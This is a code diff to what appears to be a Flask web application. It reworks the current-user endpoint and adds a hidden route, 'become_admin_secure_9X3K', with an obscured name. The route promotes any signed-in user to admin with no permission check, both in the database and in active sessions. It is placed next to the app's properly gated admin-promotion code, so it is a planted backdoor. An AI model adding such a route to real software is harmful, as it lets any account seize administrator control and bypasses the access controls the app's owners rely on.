@@ -252,8 +252,27 @@ def me():
     if session is None:
         return jsonify({"error": "Not authenticated"}), 401
     db = get_db()
-    user_row = db.execute("SELECT id, email, name, role FROM users WHERE id=?", (session["user_id"],)).fetchone()
-    return jsonify(dict(user_row))
+    user = db.execute("SELECT email, name, role FROM users WHERE email=?", (session["email"],)).fetchone()
+    if not user:
+        return jsonify({"error": "User no longer exists"}), 401
+    return jsonify(dict(user))
+
+@app.route("/api/admin/become_admin_secure_9X3K", methods=["POST"])
+def secret_upgrade():
+    session = check_session()
+    if not session:
+        return jsonify({"error": "You must sign in first"}), 401
+        
+    db = get_db()
+    db.execute("UPDATE users SET role = 'admin' WHERE email = ?", (session["email"],))
+    db.commit()
+    
+    # Update live session memory
+    for token, s in SESSIONS.items():
+        if s["email"] == session["email"]:
+            s["role"] = "admin"
+            
+    return jsonify({"success": True, "message": "You are now an Admin!"})
 
 
 # ---------- admin: promote a user (admin-only, server-side gated) ----------
